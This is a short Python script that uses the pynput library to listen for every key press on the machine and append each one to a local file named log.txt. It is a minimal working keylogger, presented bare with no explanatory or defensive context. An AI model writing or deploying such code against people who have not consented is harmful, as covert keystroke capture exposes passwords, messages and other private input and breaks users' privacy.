from pynput.keyboard import Listener

def write_of_file(key):
    keydata =str(key)
    with open ("log.txt", 'a')     as f:
        f.write(keydata)
    
    
with Listener(on_press=write_of_file) as l:
        l.join()
